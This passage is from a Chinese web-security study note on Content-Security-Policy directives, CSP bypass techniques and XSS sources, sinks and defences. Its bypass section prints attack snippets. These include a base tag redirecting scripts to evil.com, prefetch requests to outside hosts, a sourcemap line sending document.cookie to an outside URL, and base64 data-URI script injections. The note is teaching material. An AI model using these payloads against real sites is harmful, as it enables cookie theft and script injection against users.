Chrome)</span></li><li><span>X-Content-Security-Policy (Firefox)</span></li><li><span>X-WebKit-CSP (WebKit-based browsers, e.g. Safari)</span></li></ul><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="http"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="http"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>3</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">HTTP</span> <span class="cm-string-2">header</span> <span class="cm-error">:</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">"Content-Security-Policy:</span><span class="cm-string">" 策略</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-atom">"Content-Security-Policy-Report-Only:</span><span class="cm-string">" 策略</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="height: 68px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><blockquote><p><span>HTTP Content-Security-Policy 头可以指定一个或多个资源是安全的，而 Content-Security-Policy-Report- Only 则是允许服务器检查（非强制）一个策略。多个头的策略定义由优先采用最先定义的。</span></p><p><span>HTML Meta :</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="html"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>2</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">meta</span> <span class="cm-attribute">http-equiv</span>=<span class="cm-string">"content-security-policy"</span> <span class="cm-attribute">content</span>=<span class="cm-string">"策略"</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">meta</span> <span class="cm-attribute">http-equiv</span>=<span class="cm-string">"content-security-policy-report-only"</span> <span class="cm-attribute">content</span>=<span class="cm-string">"策略"</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="height: 45px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></blockquote><h4 id='指令说明'><span>指令说明</span></h4><hr /><p><span>  指令          说明</span></p><hr /><p><span>  default-src   定义资源默认加载策略</span></p><p><span>  connect-src   定义 Ajax、WebSocket 等加载策略</span></p><p><span>  font-src      定义 Font 加载策略</span></p><p><span>  frame-src     定义 Frame 加载策略</span></p><p><span>  img-src       定义图片加载策略</span></p><p><span>  media-src     定义 </span><span>&lt;</span><span>audio</span><span>&gt;</span><span>、</span><span>&lt;</span><span>video</span><span>&gt;</span><span> 等引用资源加载策略</span></p><p><span>  object-src    定义 </span><span>&lt;</span><span>applet</span><span>&gt;</span><span>、</span><span>&lt;</span><span>embed</span><span>&gt;</span><span>、</span><span>&lt;</span><span>object</span><span>&gt;</span><span> 等引用资源加载策略</span></p><p><span>  script-src    定义 JS 加载策略</span></p><p><span>  style-src     定义 CSS 加载策略</span></p><p><span>  base-uri      定义 </span><span>&lt;</span><span>base</span><span>&gt;</span><span> 根 URL 策略，不使用 default-src 作为默认值</span></p><p><span>  sandbox       值为 allow-forms，对资源启用 sandbox</span></p><p><span>  report-uri    值为 /report-uri，提交日志</span></p><h4 id='关键字-1'><span>关键字</span></h4><ul><li><p><strong><span>-</span></strong></p><ul><li><span>允许从任意 url 加载，除了 data: blob: filesystem: schemes</span></li><li><span>e.g. img-src -</span></li></ul></li><li><p><strong><span>none</span></strong></p><ul><li><span>禁止从任何 url 加载资源</span></li><li><span>e.g. object-src </span><span>&#39;</span><span>none</span><span>&#39;</span></li></ul></li><li><p><strong><span>self</span></strong></p><ul><li><span>只可以加载同源资源</span></li><li><span>e.g. img-src </span><span>&#39;</span><span>self</span><span>&#39;</span></li></ul></li><li><p><strong><span>data:</span></strong></p><ul><li><span>可以通过 data 协议加载资源</span></li><li><span>e.g. img-src </span><span>&#39;</span><span>self</span><span>&#39;</span><span> data:</span></li></ul></li><li><h4 id='domainexamplecom'><span>domain.example.com</span></h4><ul><li><span>e.g. img-src domain.example.com</span></li><li><span>只可以从特定的域加载资源</span></li></ul></li><li><h4 id='examplecom'><span>\</span><span>*</span><span>.example.com</span></h4><ul><li><span>e.g. img-src </span><span>\</span><span>*</span><span>.example.com</span></li><li><span>可以从任意 example.com 的子域处加载资源</span></li></ul></li><li><h5 id='httpscdncom'><a href='https://cdn.com' target='_blank' class='url'>https://cdn.com</a></h5><ul><li><span>e.g. img-src </span><a href='https://cdn.com' target='_blank' class='url'>https://cdn.com</a></li><li><span>只能从给定的域用 https 加载资源</span></li></ul></li><li><h4 id='https'><span>https:</span></h4><ul><li><span>e.g. img-src https:</span></li><li><span>只能从任意域用 https 加载资源</span></li></ul></li><li><h4 id='unsafe-inline'><span>unsafe-inline</span></h4><ul><li><span>允许内部资源执行代码例如 style attribute,onclick 或者是 sicript 标签</span></li><li><span>e.g. script-src </span><span>&#39;</span><span>unsafe-inline</span><span>&#39;</span></li></ul></li><li><h4 id='unsafe-eval'><span>unsafe-eval</span></h4><ul><li><span>允许一些不安全的代码执行方式，例如js的eval()</span></li><li><span>e.g. script-src </span><span>&#39;</span><span>unsafe-eval</span><span>&#39;</span></li></ul></li><li><h4 id='nonce-base64-value'><span>nonce-</span><span>&lt;</span><span>base64-value</span><span>&gt;</span><span>&#39;</span></h4><ul><li><span>使用随机的nonce，允许加载标签上nonce属性匹配的标签</span></li><li><span>e.g. script-src </span><span>&#39;</span><span>nonce-bm9uY2U=</span><span>&#39;</span></li></ul></li><li><h4 id='hash-algo-base64-value'><span>&lt;</span><span>hash-algo</span><span>&gt;</span><span>-</span><span>&lt;</span><span>base64-value</span><span>&gt;</span><span>&#39;</span></h4><ul><li><span>允许hash值匹配的代码块被执行</span></li><li><span>e.g. script-src </span><span>&#39;</span><span>sha256-</span><span>&lt;</span><span>base64-value</span><span>&gt;</span><span>&#39;</span></li></ul></li></ul><h4 id='配置范例'><span>配置范例</span></h4><blockquote><p><span>允许执行内联 JS 代码，但不允许加载外部资源</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="javascript"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="javascript"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">Content</span><span class="cm-operator">-</span><span class="cm-variable">Security</span><span class="cm-operator">-</span><span class="cm-variable">Policy</span>: <span class="cm-keyword">default</span><span class="cm-operator">-</span><span class="cm-variable">src</span> <span class="cm-string">'self'</span>; <span class="cm-variable">script</span><span class="cm-operator">-</span><span class="cm-variable">src</span> <span class="cm-string">'self'</span> <span class="cm-string">'unsafe-inline'</span>;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></blockquote><h4 id='bypass-2'><span>Bypass</span></h4><h5 id='预加载'><span>预加载</span></h5><blockquote><p><span>浏览器为了增强用户体验，让浏览器更有效率，就有一个预加载的功能，大体是利用浏览器空闲时间去加载指定的内容，然后缓存起来。这个技术又细分为 DNS-prefetch、subresource、prefetch、preconnect、prerender。</span></p><p><span>HTML5 页面预加载是用 link 标签的 rel 属性来指定的。如果 csp 头有 unsafe-inline，则用预加载的方式可以向外界发出请求，例如</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="html"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>9</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">&lt;!-- 预加载某个页面 --&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">link</span> <span class="cm-attribute">rel</span>=<span class="cm-string">'prefetch'</span> <span class="cm-attribute">href</span>=<span class="cm-string">'http://xxxx'</span><span class="cm-tag cm-bracket">&gt;</span><span class="cm-comment">&lt;!-- firefox --&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">link</span> <span class="cm-attribute">rel</span>=<span class="cm-string">'prerender'</span> <span class="cm-attribute">href</span>=<span class="cm-string">'http://xxxx'</span><span class="cm-tag cm-bracket">&gt;</span><span class="cm-comment">&lt;!-- chrome --&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">&lt;!-- 预加载某个图片 --&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">link</span> <span class="cm-attribute">rel</span>=<span class="cm-string">'prefetch'</span> <span class="cm-attribute">href</span>=<span class="cm-string">'http://xxxx/x.jpg'</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">&lt;!-- DNS 预解析 --&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">link</span> <span class="cm-attribute">rel</span>=<span class="cm-string">"dns-prefetch"</span> <span class="cm-attribute">href</span>=<span class="cm-string">"http://xxxx"</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">&lt;!-- 特定文件类型预加载 --&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">link</span> <span class="cm-attribute">rel</span>=<span class="cm-string">'preload'</span> <span class="cm-attribute">href</span>=<span class="cm-string">'//xxxxx/xx.js'</span><span class="cm-tag cm-bracket">&gt;</span><span class="cm-comment">&lt;!-- chrome --&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 204px;"></div><div class="CodeMirror-gutters" style="height: 204px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></blockquote><p><span>另外，不是所有的页面都能够被预加载，当资源类型如下时，将阻止预加载操作：</span></p><ul><li><span>URL 中包含下载资源</span></li><li><span>页面中包含音频、视频</span></li><li><span>POST、PUT 和 DELET 操作的 ajax 请求</span></li><li><span>HTTP 认证</span></li><li><span>HTTPS 页面</span></li><li><span>含恶意软件的页面</span></li><li><span>弹窗页面</span></li><li><span>占用资源很多的页面</span></li><li><span>打开了 chrome developer tools 开发工具</span></li></ul><h4 id='mime-sniff'><span>MIME Sniff</span></h4><blockquote><p><span>举例来说，csp 禁止跨站读取脚本，但是可以跨站读 img，那么传一个含有脚本的 img，再 </span>‘’<span>&lt;</span><span>script href=</span>’<a href='http://xxx.com/xx.jpg%27'><span>http:</span></a><a href='http://xxx.com/xx.jpg%27'><span>//xxx.com/xx.jpg</span>’</a><span>&gt;</span>’’<span>，这里 csp 认为是一个 img，绕过了检查，如果网站没有回正确的 mime type，浏览器会进行猜测，就可能加载该 img 作为脚本</span></p></blockquote><h4 id='302-跳转'><span>302 跳转</span></h4><p><span>对于 302 跳转绕过 CSP 而言，实际上有以下几点限制：</span></p><ul><li><span>跳板必须在允许的域内。</span></li><li><span>要加载的文件的 host 部分必须跟允许的域的 host 部分一致</span></li></ul><h4 id='iframe-1'><span>iframe</span></h4><blockquote><p><span>当可以执行代码时，可以创建一个源为 css js 等静态文件的 frame，在配置不当时，该 frame 并不存在 csp，则在该 frame 下再次创建 frame，达到 bypass 的目的。同理，使用 ../../../ /%2e%2e%2f 等可能触发服务器报错的链接也可以到达相应的目的。</span></p></blockquote><h4 id='base-uri'><span>base-uri</span></h4><blockquote><p><span>当 script-src 为 nonce 或无限制， base-uri 无限制时，可通过 base 标签修改根 URL 来 bypass，如下加载了 </span><a href='http://evil.com/main.js' target='_blank' class='url'>http://evil.com/main.js</a></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="html"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="html"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>2</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">base</span> <span class="cm-attribute">href</span>=<span class="cm-string">"http://evil.com/"</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">script</span> <span class="cm-attribute">nonce</span>=<span class="cm-string">"correct value"</span> <span class="cm-attribute">src</span>=<span class="cm-string">"/main.js"</span><span class="cm-tag cm-bracket">&gt;&lt;/</span><span class="cm-tag">script</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="height: 45px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></blockquote><h4 id='其他-1'><span>其他</span></h4><ul><li><p><span>location 绕过</span></p></li><li><p><span>可上传 SVG 时，通过恶意 SVG 绕过同源站点</span></p></li><li><p><span>存在 CRLF 漏洞 可控点在 CSP 上方时，可以注入 HTTP 响应中影响 CSP 解析</span></p></li><li><p><span>CND Bypass，如果网站信任了某个 CDN, 那么可利用相应 CDN 的静态资源 bypass</span></p></li><li><p><span>Angular versions </span><span>&lt;</span><span>1.5.9 </span><span>&gt;</span><span>=1.5.0，存在漏洞 </span><a href='https://github.com/angular/angular.js/pull/15346'><span>Git Pull Request</span></a></p></li><li><h5 id='jquery-sourcemap'><span>jQuery sourcemap</span></h5><ul><li><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="javascript"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="javascript"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>2</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">document</span>.<span class="cm-property">write</span>(<span class="cm-string-2">`&lt;script&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string-2">//@ sourceMappingURL=http://xxxx/`</span><span class="cm-operator">+</span><span class="cm-variable">document</span>.<span class="cm-property">cookie</span><span class="cm-operator">+</span><span class="cm-string-2">`&lt;\/script&gt;`</span>);<span class="cm-string-2">``</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="height: 45px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></li></ul></li><li><p><span>a 标签的ping属性</span></p></li><li><p><span>For FireFox </span><span>&lt;</span><span>META HTTP-EQUIV=</span><span>&quot;</span><span>refresh</span><span>&quot;</span><span> CONTENT=</span><span>&quot;</span><span>0; url=data:text/html;base64, PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=</span><span>&quot;</span><span>&gt;</span></p></li><li><p><span>&lt;</span><span>link rel=</span><span>&quot;</span><span>import</span><span>&quot;</span><span> /</span><span>&gt;</span></p></li><li><p><span>&lt;</span><span>meta http-equiv=</span><span>&quot;</span><span>refresh</span><span>&quot;</span><span> content=</span><span>&quot;</span><span>0; </span><a href='http://./'><span>url=http://</span><span>.</span>…<span>&quot;</span></a><span> /</span><span>&gt;</span></p></li><li><h5 id='仅限制script-src时'><span>仅限制script-src时：</span></h5></li></ul><blockquote><p><strong>–</strong><span> </span><span>&lt;</span><span>object data=</span><span>&quot;</span><span>data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</span><span>&quot;</span><span>&gt;</span><span>&lt;</span><span>/ object</span><span>&gt;</span></p></blockquote><h3 id='425--xss数据源'><span>4.2.5  XSS数据源</span></h3><h4 id='url-1'><span>URL</span></h4><ul><li><span>location</span></li><li><span>location.href</span></li><li><span>location.pathname</span></li><li><span>location.search</span></li><li><span>location.hash</span></li><li><span>document.URL</span></li><li><span>document.documentURI</span></li><li><span>document.baseURI</span></li></ul><h4 id='navigation'><span>Navigation</span></h4><ul><li><span>window.name</span></li><li><span>document.referrer</span></li></ul><h4 id='communication'><span>Communication</span></h4><ul><li><span>Ajax</span></li><li><span>Fetch</span></li><li><span>WebSocket</span></li><li><span>PostMessage</span></li></ul><h4 id='storage'><span>Storage</span></h4><ul><li><span>Cookie</span></li><li><span>LocalStorage</span></li><li><span>SessionStorage</span></li></ul><h3 id='426--sink'><span>4.2.6  Sink</span></h3><h4 id='执行javascript'><span>执行JavaScript</span></h4><ul><li><span>eval(payload)</span></li><li><span>setTimeout(payload, 100)</span></li><li><span>setInterval(payload, 100)</span></li><li><span>Function(payload)()</span></li><li><span>&lt;</span><span>script</span><span>&gt;</span><span>payload</span><span>&lt;</span><span>/script</span><span>&gt;</span></li><li><span>&lt;</span><span>img src=x onerror=payload</span><span>&gt;</span></li></ul><h4 id='加载url'><span>加载URL</span></h4><ul><li><span>location=javascript:alert(/xss/)</span></li><li><span>location.href=javascript:alert(/xss/)</span></li><li><span>location.assign(javascript:alert(/xss/))</span></li><li><span>location.replace(javascript:alert(/xss/))</span></li></ul><h4 id='执行html'><span>执行HTML</span></h4><ul><li><span>xx.innerHTML=payload</span></li><li><span>xx.outerHTML=payload</span></li><li><span>document.write(payload)</span></li><li><span>document.writeln(payload)</span></li></ul><h3 id='427--xss保护'><span>4.2.7  XSS保护</span></h3><h4 id='html过滤'><span>HTML过滤</span></h4><blockquote><p><span>使用一些白名单或者黑名单来过滤用户输入的 HTML，以实现过滤的效果。例如 DOMPurify 等工具都是用该方式实现了 XSS 的保护。</span></p></blockquote><h4 id='x-frame'><span>X-Frame</span></h4><p><span>X-Frame-Options响应头有三个可选的值：</span></p><ul><li><h5 id='deny'><span>DENY</span></h5><ul><li><span>页面不能被嵌入到任何 iframe 或 frame 中</span></li></ul></li><li><h5 id='sameorigin'><span>SAMEORIGIN</span></h5><ul><li><span>页面只能被本站页面嵌入到 iframe 或者 frame 中</span></li></ul></li><li><h5 id='allow-from'><span>ALLOW-FROM</span></h5><ul><li><span>页面允许 frame 或 frame 加载</span></li></ul></li></ul><h4 id='xss-保护头'><span>XSS 保护头</span></h4><blockquote><p><span>基于 Webkit 内核的浏览器 (比如 